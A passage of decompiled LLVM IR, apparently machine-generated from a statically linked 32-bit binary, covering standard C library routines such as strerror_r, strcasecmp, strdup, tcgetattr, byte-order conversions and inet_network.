  %v4_8051ef4 = ptrtoint i8* %tmp4 to i32
  %v8_8051f078 = icmp eq i32 %tmp, 0
  %v1_8051f0810 = icmp eq i1 %v8_8051f078, false
  br i1 %v1_8051f0810, label %dec_label_pc_8051f01, label %dec_label_pc_8051f0a

dec_label_pc_8051f01:                             ; preds = %entry, %dec_label_pc_8051f06
  %v1_8051f0712 = phi i32 [ %v1_8051f07, %dec_label_pc_8051f06 ], [ %tmp, %entry ]
  %v0_8051f0a11 = phi i32 [ %v1_8051f06, %dec_label_pc_8051f06 ], [ %v4_8051ef4, %entry ]
  %v1_8051f01 = inttoptr i32 %v0_8051f0a11 to i8*
  %v2_8051f01 = load i8, i8* %v1_8051f01, align 1
  %v3_8051f01 = icmp eq i8 %v2_8051f01, 0
  br i1 %v3_8051f01, label %dec_label_pc_8051f0a, label %dec_label_pc_8051f06

dec_label_pc_8051f06:                             ; preds = %dec_label_pc_8051f01
  %v1_8051f06 = add i32 %v0_8051f0a11, 1
  %v1_8051f07 = add i32 %v1_8051f0712, -1
  %v8_8051f07 = icmp eq i32 %v1_8051f07, 0
  %v1_8051f08 = icmp eq i1 %v8_8051f07, false
  br i1 %v1_8051f08, label %dec_label_pc_8051f01, label %dec_label_pc_8051f0a

dec_label_pc_8051f0a:                             ; preds = %dec_label_pc_8051f06, %dec_label_pc_8051f01, %entry
  %v0_8051f0a.lcssa = phi i32 [ %v4_8051ef4, %entry ], [ %v0_8051f0a11, %dec_label_pc_8051f01 ], [ %v1_8051f06, %dec_label_pc_8051f06 ]
  %v2_8051f0a = sub i32 %v0_8051f0a.lcssa, %v4_8051ef4
  ret i32 %v2_8051f0a

; uselistorder directives
  uselistorder i32 %v1_8051f07, { 1, 0 }
  uselistorder i32 %v0_8051f0a11, { 0, 2, 1 }
  uselistorder i32 %v4_8051ef4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051f01, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051f10 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v3_8051f21 = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_8051f29 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f10, i32* @ebx, align 4
  ret i32 %v0_8051f29
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_8051f30 = load i32, i32* @ebp, align 4
  %v0_8051f31 = load i32, i32* @edi, align 4
  %v0_8051f32 = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8051f42 = icmp ugt i32 %arg1, 124
  br i1 %v6_8051f42, label %dec_label_pc_8051f5f, label %dec_label_pc_8051f44

dec_label_pc_8051f44:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805b980.225 to i32), i32* @esi, align 4
  %v1_8051f544 = icmp eq i32 %arg1, 0
  %v1_8051f5611 = icmp eq i1 %v1_8051f544, false
  br i1 %v1_8051f5611, label %dec_label_pc_8051f4d, label %dec_label_pc_8051f58

dec_label_pc_8051f4d:                             ; preds = %dec_label_pc_8051f44, %dec_label_pc_8051f4d
  %v0_8051f50 = phi i32 [ %v3_8051f50, %dec_label_pc_8051f4d ], [ %arg1, %dec_label_pc_8051f44 ]
  %v0_8051f53 = phi i32 [ %v1_8051f53, %dec_label_pc_8051f4d ], [ ptrtoint ([8 x i8]* @global_var_805b980.225 to i32), %dec_label_pc_8051f44 ]
  %v1_8051f4d = inttoptr i32 %v0_8051f53 to i8*
  %v2_8051f4d = load i8, i8* %v1_8051f4d, align 1
  %v7_8051f4d = icmp eq i8 %v2_8051f4d, 0
  %v2_8051f50 = zext i1 %v7_8051f4d to i32
  %v3_8051f50 = add i32 %v2_8051f50, %v0_8051f50
  %v16_8051f50 = icmp eq i32 %v3_8051f50, 0
  %v1_8051f53 = add i32 %v0_8051f53, 1
  store i32 %v1_8051f53, i32* @esi, align 4
  %v1_8051f56 = icmp eq i1 %v16_8051f50, false
  br i1 %v1_8051f56, label %dec_label_pc_8051f4d, label %dec_label_pc_8051f58

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f4d, %dec_label_pc_8051f44
  %v0_8051f5a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b980.225 to i32), %dec_label_pc_8051f44 ], [ %v1_8051f53, %dec_label_pc_8051f4d ]
  store i32 0, i32* @ebp, align 4
  %v1_8051f5a = inttoptr i32 %v0_8051f5a to i8*
  %v2_8051f5a = load i8, i8* %v1_8051f5a, align 1
  %v3_8051f5a = icmp eq i8 %v2_8051f5a, 0
  %v1_8051f5d = icmp eq i1 %v3_8051f5a, false
  br i1 %v1_8051f5d, label %dec_label_pc_8051f58.dec_label_pc_8051f8e_crit_edge, label %dec_label_pc_8051f5f

dec_label_pc_8051f58.dec_label_pc_8051f8e_crit_edge: ; preds = %dec_label_pc_8051f58
  br label %dec_label_pc_8051f8e

dec_label_pc_8051f5f:                             ; preds = %dec_label_pc_8051f58, %entry
  %v1_8051f62 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_8051f73 = bitcast i32* %stack_var_-17 to i8*
  %v7_8051f73 = call i32 @_uintmaxtostr(i8* %v6_8051f73, i32 %arg1, i32 %v1_8051f62, i32 -10, i32 0)
  %v1_8051f82 = add i32 %v7_8051f73, -14
  store i32 %v1_8051f82, i32* @esi, align 4
  %v5_8051f85 = inttoptr i32 %v1_8051f82 to i8*
  store i8* %v5_8051f85, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8051f82 to i16*
  %v6_8051f86 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805b962.226 to i32), i32 14)
  %v1_8051f98.pre = load i32, i32* @edi, align 4
  %v0_8051f9e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f8e

dec_label_pc_8051f8e:                             ; preds = %dec_label_pc_8051f58.dec_label_pc_8051f8e_crit_edge, %dec_label_pc_8051f5f
  %v0_8051f9e = phi i32 [ %v0_8051f5a, %dec_label_pc_8051f58.dec_label_pc_8051f8e_crit_edge ], [ %v0_8051f9e.pre, %dec_label_pc_8051f5f ]
  %v1_8051f98 = phi i32 [ %arg3, %dec_label_pc_8051f58.dec_label_pc_8051f8e_crit_edge ], [ %v1_8051f98.pre, %dec_label_pc_8051f5f ]
  %v4_8051f8e = icmp eq i32 %arg2, 0
  %v3_8051f98 = select i1 %v4_8051f8e, i32 0, i32 %v1_8051f98
  store i32 %v3_8051f98, i32* @edi, align 4
  %v5_8051f9e = inttoptr i32 %v0_8051f9e to i8*
  store i8* %v5_8051f9e, i8** %stack_var_-108, align 4
  %v3_8051f9f = call i32 @strlen(i8* %v5_8051f9e)
  %v1_8051fa7 = add i32 %v3_8051f9f, 1
  store i32 %v1_8051fa7, i32* %ebx.global-to-local, align 4
  %v1_8051faa = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_8051fa7, %v1_8051faa
  br i1 %tmp, label %dec_label_pc_8051fae, label %dec_label_pc_8051fb5

dec_label_pc_8051fae:                             ; preds = %dec_label_pc_8051f8e
  store i32 %v1_8051faa, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8051fb5

dec_label_pc_8051fb5:                             ; preds = %dec_label_pc_8051f8e, %dec_label_pc_8051fae
  %v0_8051fba = phi i32 [ %v1_8051fa7, %dec_label_pc_8051f8e ], [ %v1_8051faa, %dec_label_pc_8051fae ]
  %v1_8051fb5 = icmp eq i32 %v0_8051fba, 0
  br i1 %v1_8051fb5, label %dec_label_pc_8051fd1, label %dec_label_pc_8051fb9

dec_label_pc_8051fb9:                             ; preds = %dec_label_pc_8051fb5
  %v0_8051fbb = load i32, i32* @esi, align 4
  %v8_8051fbc = inttoptr i32 %arg2 to i8*
  store i8* %v8_8051fbc, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8051fc0 = call i32 @memcpy(i16* %tmp45, i32 %v0_8051fbb, i32 %v0_8051fba)
  %v1_8051fcc = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fcc = add i32 %arg2, -1
  %v3_8051fcc = add i32 %v2_8051fcc, %v1_8051fcc
  %v4_8051fcc = inttoptr i32 %v3_8051fcc to i8*
  store i8 0, i8* %v4_8051fcc, align 1
  br label %dec_label_pc_8051fd1

dec_label_pc_8051fd1:                             ; preds = %dec_label_pc_8051fb5, %dec_label_pc_8051fb9
  %v0_8051fd1 = load i32, i32* @ebp, align 4
  %v1_8051fd1 = icmp eq i32 %v0_8051fd1, 0
  br i1 %v1_8051fd1, label %dec_label_pc_8051fdc, label %dec_label_pc_8051fd5

dec_label_pc_8051fd5:                             ; preds = %dec_label_pc_8051fd1
  %v0_8051fd5 = load i8*, i8** %stack_var_-108, align 4
  %v1_8051fd5 = ptrtoint i8* %v0_8051fd5 to i32
  %v2_8051fd5 = call i32 @__errno_location(i32 %v1_8051fd5)
  %v0_8051fda = load i32, i32* @ebp, align 4
  %v2_8051fda = inttoptr i32 %v2_8051fd5 to i32*
  store i32 %v0_8051fda, i32* %v2_8051fda, align 4
  %v0_8051fdf.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051fdc

dec_label_pc_8051fdc:                             ; preds = %dec_label_pc_8051fd1, %dec_label_pc_8051fd5
  %v0_8051fdf = phi i32 [ 0, %dec_label_pc_8051fd1 ], [ %v0_8051fdf.pre, %dec_label_pc_8051fd5 ]
  store i32 %v0_8051f32, i32* @esi, align 4
  store i32 %v0_8051f31, i32* @edi, align 4
  store i32 %v0_8051f30, i32* @ebp, align 4
  ret i32 %v0_8051fdf

; uselistorder directives
  uselistorder i32 %v1_8051faa, { 1, 2, 0 }
  uselistorder i32 %v1_8051fa7, { 1, 0, 2 }
  uselistorder i32 %v1_8051f53, { 0, 2, 1 }
  uselistorder i32 %v3_8051f50, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805b980.225 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051fdc, { 1, 0 }
  uselistorder label %dec_label_pc_8051fd1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb5, { 1, 0 }
  uselistorder label %dec_label_pc_8051f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8051f4d, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8051ff8 = inttoptr i32 %arg2 to i8*
  %v3_8051ff8 = call i32 @memmove(i8* %v2_8051ff8, i32 %arg1)
  ret i32 %v3_8051ff8
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052001 = load i32, i32* bitcast (i32** @global_var_8062dc8.227 to i32*), align 8
  %v4_805200a = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8052012

dec_label_pc_8052012:                             ; preds = %dec_label_pc_805202f, %entry
  %storemerge = phi i32 [ %v4_805200a, %entry ], [ %v1_8052030, %dec_label_pc_805202f ]
  %v0_8052030 = phi i32 [ %v4_805200a, %entry ], [ %v1_8052030, %dec_label_pc_805202f ]
  %v0_80520356 = phi i32 [ 0, %entry ], [ %v0_80520357, %dec_label_pc_805202f ]
  %v0_805202f = phi i32 [ %arg2, %entry ], [ %v1_805202f, %dec_label_pc_805202f ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_8052012 = icmp eq i32 %v0_8052030, %v0_805202f
  %.pre = inttoptr i32 %v0_8052030 to i8*
  br i1 %v12_8052012, label %dec_label_pc_805202a, label %dec_label_pc_8052016

dec_label_pc_8052016:                             ; preds = %dec_label_pc_8052012
  %v2_8052016 = load i8, i8* %.pre, align 1
  %v3_8052016 = zext i8 %v2_8052016 to i32
  %v2_8052019 = mul nuw nsw i32 %v3_8052016, 2
  %v3_8052019 = add i32 %v2_8052019, %v0_8052001
  %v4_8052019 = inttoptr i32 %v3_8052019 to i16*
  %v5_8052019 = load i16, i16* %v4_8052019, align 2
  %v6_8052019 = sext i16 %v5_8052019 to i32
  %v1_805201d = inttoptr i32 %v0_805202f to i8*
  %v2_805201d = load i8, i8* %v1_805201d, align 1
  %v3_805201d = zext i8 %v2_805201d to i32
  %v2_8052020 = mul nuw nsw i32 %v3_805201d, 2
  %v3_8052020 = add i32 %v2_8052020, %v0_8052001
  %v4_8052020 = inttoptr i32 %v3_8052020 to i16*
  %v5_8052020 = load i16, i16* %v4_8052020, align 2
  %v6_8052020 = sext i16 %v5_8052020 to i32
  %v2_8052024 = sub nsw i32 %v6_8052019, %v6_8052020
  %v12_8052024 = icmp eq i32 %v2_8052024, 0
  store i32 %v2_8052024, i32* @edx, align 4
  %v1_8052028 = icmp eq i1 %v12_8052024, false
  br i1 %v1_8052028, label %dec_label_pc_8052033, label %dec_label_pc_805202a

dec_label_pc_805202a:                             ; preds = %dec_label_pc_8052012, %dec_label_pc_8052016
  %v0_80520357 = phi i32 [ %v2_8052024, %dec_label_pc_8052016 ], [ %v0_80520356, %dec_label_pc_8052012 ]
  %v2_805202a = load i8, i8* %.pre, align 1
  %v3_805202a = icmp eq i8 %v2_805202a, 0
  br i1 %v3_805202a, label %dec_label_pc_8052033, label %dec_label_pc_805202f

dec_label_pc_805202f:                             ; preds = %dec_label_pc_805202a
  %v1_805202f = add i32 %v0_805202f, 1
  %v1_8052030 = add i32 %v0_8052030, 1
  br label %dec_label_pc_8052012

dec_label_pc_8052033:                             ; preds = %dec_label_pc_805202a, %dec_label_pc_8052016
  %v0_8052035 = phi i32 [ %v0_80520357, %dec_label_pc_805202a ], [ %v2_8052024, %dec_label_pc_8052016 ]
  ret i32 %v0_8052035

; uselistorder directives
  uselistorder i32 %v1_8052030, { 1, 0 }
  uselistorder i32 %v0_80520357, { 1, 0 }
  uselistorder i32 %v2_8052024, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805202f, { 1, 2, 0 }
  uselistorder i32 %v0_8052030, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805202a, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052038 = load i32, i32* @edi, align 4
  %v0_8052039 = load i32, i32* @esi, align 4
  %v0_805203a = load i32, i32* @ebx, align 4
  store i32 %v0_805203a, i32* %stack_var_-12, align 4
  %v4_805203b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805203b, i32* @edi, align 4
  %v3_8052043 = call i32 @strlen(i8* %arg1)
  %v1_8052048 = add i32 %v3_8052043, 1
  store i32 %v1_8052048, i32* @esi, align 4
  %v2_805204e = call i32 @malloc(i32 %v1_8052048)
  %v1_8052056 = icmp eq i32 %v2_805204e, 0
  store i32 %v2_805204e, i32* %ebx.global-to-local, align 4
  br i1 %v1_8052056, label %dec_label_pc_8052068, label %dec_label_pc_805205c

dec_label_pc_805205c:                             ; preds = %entry
  %v0_805205d = load i32, i32* @esi, align 4
  %v0_805205e = load i32, i32* @edi, align 4
  %tmp10 = inttoptr i32 %v2_805204e to i16*
  %v6_8052060 = call i32 @memcpy(i16* %tmp10, i32 %v0_805205e, i32 %v0_805205d)
  %v0_8052068.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052068

dec_label_pc_8052068:                             ; preds = %entry, %dec_label_pc_805205c
  %v0_8052068 = phi i32 [ 0, %entry ], [ %v0_8052068.pre, %dec_label_pc_805205c ]
  %v2_805206a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805206a, i32* @ebx, align 4
  store i32 %v0_8052039, i32* @esi, align 4
  store i32 %v0_8052038, i32* @edi, align 4
  ret i32 %v0_8052068

; uselistorder directives
  uselistorder i32 %v2_805204e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052068, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052080 = inttoptr i32 %arg1 to i8*
  %v4_8052080 = call i32 @strtok_r(i8* %v3_8052080, i32 %arg2, i32 ptrtoint (i32* @global_var_8067440.228 to i32))
  ret i32 %v4_8052080
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052098 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_805209d = icmp eq i32 %v3_8052098, 0
  %v1_805209f = zext i1 %v1_805209d to i32
  ret i32 %v1_805209f
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80520ba = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v3_80520ba
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80520c4 = load i32, i32* @esi, align 4
  %v0_80520c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80520c5, i32* %stack_var_-8, align 4
  %v2_80520c9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80520c9, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_80520db = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_80520c9)
  store i32 %v3_80520db, i32* %eax.global-to-local, align 4
  %v1_80520e3 = icmp eq i32 %v3_80520db, 0
  store i32 %v3_80520db, i32* @esi, align 4
  %v1_80520e7 = icmp eq i1 %v1_80520e3, false
  br i1 %v1_80520e7, label %dec_label_pc_805212c, label %dec_label_pc_80520e9

dec_label_pc_80520e9:                             ; preds = %entry
  %v3_80520e9 = load i32, i32* %stack_var_-44, align 4
  %v1_80520ed = load i32, i32* @ebx, align 4
  %v2_80520ed = inttoptr i32 %v1_80520ed to i32*
  store i32 %v3_80520e9, i32* %v2_80520ed, align 4
  %v1_80520f3 = load i32, i32* @ebx, align 4
  %v2_80520f3 = add i32 %v1_80520f3, 4
  %v3_80520f3 = inttoptr i32 %v2_80520f3 to i32*
  %v1_80520fa = load i32, i32* @ebx, align 4
  %v2_80520fa = add i32 %v1_80520fa, 8
  %v3_80520fa = inttoptr i32 %v2_80520fa to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052101 = load i32, i32* @ebx, align 4
  %v2_8052101 = add i32 %v1_8052101, 12
  %v3_8052101 = inttoptr i32 %v2_8052101 to i32*
  store i32 %tmp3, i32* %v3_8052101, align 4
  %v4_8052104 = zext i8 %tmp to i32
  %v5_8052104 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052104 = and i32 %v5_8052104, -256
  %v7_8052104 = or i32 %v6_8052104, %v4_8052104
  store i32 %v7_8052104, i32* %eax.global-to-local, align 4
  %v2_8052108 = load i32, i32* @ebx, align 4
  %v3_8052108 = add i32 %v2_8052108, 16
  %v4_8052108 = inttoptr i32 %v3_8052108 to i8*
  store i8 %tmp, i8* %v4_8052108, align 1
  %v0_805210b = load i32, i32* %eax.global-to-local, align 4
  %v2_805210e = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052113 = load i32, i32* @ebx, align 4
  %v1_8052113 = add i32 %v0_8052113, 17
  store i32 %v1_8052113, i32* %eax.global-to-local, align 4
  %v4_8052117 = call i32 @__GI_mempcpy(i32 %v1_8052113, i32 %v2_805210e, i32 19, i32 %v0_805210b)
  store i32 %v4_8052117, i32* %eax.global-to-local, align 4
  %v3_8052124 = inttoptr i32 %v4_8052117 to i8*
  %v4_8052124 = call i32 @__GI_memset(i8* %v3_8052124, i32 0, i32 13)
  store i32 %v4_8052124, i32* %eax.global-to-local, align 4
  %v0_805212f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805212c

dec_label_pc_805212c:                             ; preds = %entry, %dec_label_pc_80520e9
  %v0_805212f = phi i32 [ %v3_80520db, %entry ], [ %v0_805212f.pre, %dec_label_pc_80520e9 ]
  store i32 %v0_805212f, i32* %eax.global-to-local, align 4
  %v2_8052131 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052131, i32* @ebx, align 4
  store i32 %v0_80520c4, i32* @esi, align 4
  ret i32 %v0_805212f

; uselistorder directives
  uselistorder i32 %v0_805212f, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805212c, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8052139 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8052139 = zext i16 %v3_8052139 to i32
  ret i32 %v4_8052139
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052145 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052145
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_805214d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_805214d = zext i16 %v3_805214d to i32
  ret i32 %v4_805214d
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052159 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052159
}

define i32 @inet_network(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8052163 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8052176

dec_label_pc_8052176:                             ; preds = %dec_label_pc_805221e, %entry
  %v3_8052207 = phi i32 [ 0, %entry ], [ %v5_805220c, %dec_label_pc_805221e ]
  %v2_8052215 = phi i32 [ 0, %entry ], [ %v3_8052215, %dec_label_pc_805221e ]
  %v0_8052184 = phi i32 [ %v4_8052163, %entry ], [ %v1_805221e, %dec_label_pc_805221e ]
  %v1_8052176 = inttoptr i32 %v0_8052184 to i8*
  %v2_8052176 = load i8, i8* %v1_8052176, align 1
  %v8_8052176 = icmp eq i8 %v2_8052176, 48
  br i1 %v8_8052176, label %dec_label_pc_8052184, label %dec_label_pc_805217b

dec_label_pc_805217b:                             ; preds = %dec_label_pc_8052176
  br label %dec_label_pc_80521a3

dec_label_pc_8052184:                             ; preds = %dec_label_pc_8052176
  %v1_8052184 = add i32 %v0_8052184, 1
  %v1_8052185 = inttoptr i32 %v1_8052184 to i8*
  %v2_8052185 = load i8, i8* %v1_8052185, align 1
  %v3_8052185 = zext i8 %v2_8052185 to i32
  %v4_8052185 = load i32, i32* @eax, align 4
  %v5_8052185 = and i32 %v4_8052185, -256
  %v6_8052185 = or i32 %v5_8052185, %v3_8052185
  store i32 %v6_8052185, i32* @eax, align 4
  %v10_8052187 = icmp eq i8 %v2_8052185, 120
  br i1 %v10_8052187, label %dec_label_pc_805219b, label %dec_label_pc_805218b

dec_label_pc_805218b:                             ; preds = %dec_label_pc_8052184
  %v10_805218b = icmp eq i8 %v2_8052185, 88
  br i1 %v10_805218b, label %dec_label_pc_805219b, label %dec_label_pc_805218f

dec_label_pc_805218f:                             ; preds = %dec_label_pc_805218b
  br label %dec_label_pc_80521a3

dec_label_pc_805219b:                             ; preds = %dec_label_pc_805218b, %dec_label_pc_8052184
  %v1_805219b = add i32 %v0_8052184, 2
  br label %dec_label_pc_80521a3

dec_label_pc_80521a3:                             ; preds = %dec_label_pc_805218f, %dec_label_pc_805217b, %dec_label_pc_805219b
  %v0_80521f74 = phi i32 [ %v1_8052184, %dec_label_pc_805218f ], [ %v0_8052184, %dec_label_pc_805217b ], [ %v1_805219b, %dec_label_pc_805219b ]
  %v0_80521fd13 = phi i32 [ 1, %dec_label_pc_805218f ], [ 0, %dec_label_pc_805217b ], [ 0, %dec_label_pc_805219b ]
  %v0_80521cc10 = phi i32 [ 8, %dec_label_pc_805218f ], [ 10, %dec_label_pc_805217b ], [ 16, %dec_label_pc_805219b ]
  %v4_80521f7.pre = load i32, i32* @edx, align 4
  %v1_80521f740 = inttoptr i32 %v0_80521f74 to i8*
  %v2_80521f741 = load i8, i8* %v1_80521f740, align 1
  %v3_80521f742 = zext i8 %v2_80521f741 to i32
  %v5_80521f743 = and i32 %v4_80521f7.pre, -256
  %v6_80521f744 = or i32 %v3_80521f742, %v5_80521f743
  store i32 %v6_80521f744, i32* @edx, align 4
  %v4_80521f945 = icmp eq i8 %v2_80521f741, 0
  %v1_80521fb47 = icmp eq i1 %v4_80521f945, false
  br i1 %v1_80521fb47, label %dec_label_pc_80521a7.lr.ph, label %dec_label_pc_80521fd

dec_label_pc_80521a7.lr.ph:                       ; preds = %dec_label_pc_80521a3
  %v6_80521cc = icmp eq i32 %v0_80521cc10, 16
  %v1_80521cf = icmp eq i1 %v6_80521cc, false
  %v9_80521b7 = icmp eq i32 %v0_80521cc10, 8
  %v1_80521ba = icmp eq i1 %v9_80521b7, false
  br label %dec_label_pc_80521a7

dec_label_pc_80521a7:                             ; preds = %dec_label_pc_80521a7.lr.ph, %dec_label_pc_80521f1
  %v6_80521f753 = phi i32 [ %v6_80521f744, %dec_label_pc_80521a7.lr.ph ], [ %v6_80521f7, %dec_label_pc_80521f1 ]
  %v3_80521f752 = phi i32 [ %v3_80521f742, %dec_label_pc_80521a7.lr.ph ], [ %v3_80521f7, %dec_label_pc_80521f1 ]
  %v2_80521f751 = phi i8 [ %v2_80521f741, %dec_label_pc_80521a7.lr.ph ], [ %v2_80521f7, %dec_label_pc_80521f1 ]
  %v0_805221e50 = phi i32 [ %v0_80521f74, %dec_label_pc_80521a7.lr.ph ], [ %v1_80521f1, %dec_label_pc_80521f1 ]
  %v4_805220c49 = phi i32 [ 0, %dec_label_pc_80521a7.lr.ph ], [ %storemerge, %dec_label_pc_80521f1 ]
  %v0_80521fd48 = phi i32 [ %v0_80521fd13, %dec_label_pc_80521a7.lr.ph ], [ 1, %dec_label_pc_80521f1 ]
  %v0_80521a7 = load i32, i32* @global_var_8062dc0, align 64
  %v2_80521af = mul nuw nsw i32 %v3_80521f752, 2
  %v3_80521af = add i32 %v0_80521a7, %v2_80521af
  %v4_80521af = inttoptr i32 %v3_80521af to i16*
  %v5_80521af = load i16, i16* %v4_80521af, align 2
  %v6_80521af = zext i16 %v5_80521af to i32
  store i32 %v6_80521af, i32* @eax, align 4
  %v2_80521b3 = and i16 %v5_80521af, 8
  %v3_80521b3 = icmp eq i16 %v2_80521b3, 0
  br i1 %v3_80521b3, label %dec_label_pc_80521cc, label %dec_label_pc_80521b7

dec_label_pc_80521b7:                             ; preds = %dec_label_pc_80521a7
  br i1 %v1_80521ba, label %dec_label_pc_80521c1, label %dec_label_pc_80521bc

dec_label_pc_80521bc:                             ; preds = %dec_label_pc_80521b7
  %tmp = icmp ult i8 %v2_80521f751, 56
  br i1 %tmp, label %dec_label_pc_80521c1, label %dec_label_pc_8052228

dec_label_pc_80521c1:                             ; preds = %dec_label_pc_80521bc, %dec_label_pc_80521b7
  %v4_80521c3 = mul i32 %v4_805220c49, %v0_80521cc10
  store i32 %v4_80521c3, i32* @eax, align 4
  %v2_80521c6 = add i32 %v4_80521c3, -48
  %v3_80521c6 = add i32 %v2_80521c6, %v3_80521f752
  br label %dec_label_pc_80521e9

dec_label_pc_80521cc:                             ; preds = %dec_label_pc_80521a7
  br i1 %v1_80521cf, label %dec_label_pc_80521fd, label %dec_label_pc_80521d1

dec_label_pc_80521d1:                             ; preds = %dec_label_pc_80521cc
  %v2_80521d1 = and i32 %v6_80521af, 16
  %v3_80521d1 = icmp eq i32 %v2_80521d1, 0
  br i1 %v3_80521d1, label %dec_label_pc_80521fd, label %dec_label_pc_80521d5

dec_label_pc_80521d5:                             ; preds = %dec_label_pc_80521d1
  store i32 0, i32* @eax, align 4
  %v2_80521e2 = mul i32 %v4_805220c49, 16
  %v2_80521e5 = add i32 %v2_80521e2, -87
  br label %dec_label_pc_80521e9

dec_label_pc_80521e9:                             ; preds = %dec_label_pc_80521c1, %dec_label_pc_80521d5
  %v4_80521f76 = phi i32 [ %v6_80521f753, %dec_label_pc_80521c1 ], [ %v2_80521e2, %dec_label_pc_80521d5 ]
  %storemerge = phi i32 [ %v3_80521c6, %dec_label_pc_80521c1 ], [ %v2_80521e5, %dec_label_pc_80521d5 ]
  %tmp105 = icmp ult i32 %storemerge, 256
  br i1 %tmp105, label %dec_label_pc_80521f1, label %dec_label_pc_8052228

dec_label_pc_80521f1:                             ; preds = %dec_label_pc_80521e9
  %v1_80521f1 = add i32 %v0_805221e50, 1
  %v1_80521f7 = inttoptr i32 %v1_80521f1 to i8*
  %v2_80521f7 = load i8, i8* %v1_80521f7, align 1
  %v3_80521f7 = zext i8 %v2_80521f7 to i32
  %v5_80521f7 = and i32 %v4_80521f76, -256
  %v6_80521f7 = or i32 %v3_80521f7, %v5_80521f7
  store i32 %v6_80521f7, i32* @edx, align 4
  %v4_80521f9 = icmp eq i8 %v2_80521f7, 0
  %v1_80521fb = icmp eq i1 %v4_80521f9, false
  br i1 %v1_80521fb, label %dec_label_pc_80521a7, label %dec_label_pc_80521fd.thread

